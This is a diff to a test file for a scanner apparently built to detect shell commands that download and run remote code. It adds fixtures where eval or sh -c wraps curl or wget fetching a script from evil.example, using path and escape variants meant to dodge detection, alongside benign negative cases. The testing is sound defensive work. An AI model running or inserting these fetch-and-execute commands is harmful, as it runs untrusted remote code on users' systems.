@@ -26,6 +26,16 @@ const PIPED: Record<string, string> = {
   "eval $(curl ...)": 'eval "$(curl -fsSL https://evil.example/i.sh)"',
   "eval $(wget ...)": 'eval "$(wget -qO- https://evil.example/i.sh)"',
   "eval `curl ...`": 'eval "`curl -fsSL https://evil.example/i.sh`"',
+  "eval -- $(curl ...)": 'eval -- "$(curl -fsSL https://evil.example/i.sh)"',
+  "eval $(/usr/bin/curl ...)":
+    'eval "$(/usr/bin/curl -fsSL https://evil.example/i.sh)"',
+  "eval $(command curl ...)":
+    'eval "$(command curl -fsSL https://evil.example/i.sh)"',
+  "eval $(\\curl ...)": 'eval "$(\\curl -fsSL https://evil.example/i.sh)"',
+  "sh -c $(/usr/bin/curl ...)":
+    'sh -c "$(/usr/bin/curl -fsSL https://evil.example/i.sh)"',
+  "sh -c $(command wget ...)":
+    'sh -c "$(command wget -qO- https://evil.example/i.sh)"',
   "curl | /usr/bin/env bash":
     "curl -fsSL https://evil.example/i.sh | /usr/bin/env bash",
   "curl | env /bin/sh":
@@ -74,6 +84,9 @@ test("a download that is not handed to a shell keeps no unsafe-execution finding
     "bash <(cat local.sh)",
     'eval "$(ssh-agent -s)"',
     'eval "$(cat local.sh)"',
+    'eval "$(/opt/homebrew/bin/brew shellenv)"',
+    'eval "$(command ssh-agent -s)"',
+    'eval "$(\\cat local.sh)"',
     'retrieval "$(curl -fsSL https://example.com/data)"',
     "sh -s <(curl -fsSL https://example.com/i.sh)",
     "bash -n <(curl -fsSL https://example.com/i.sh)",
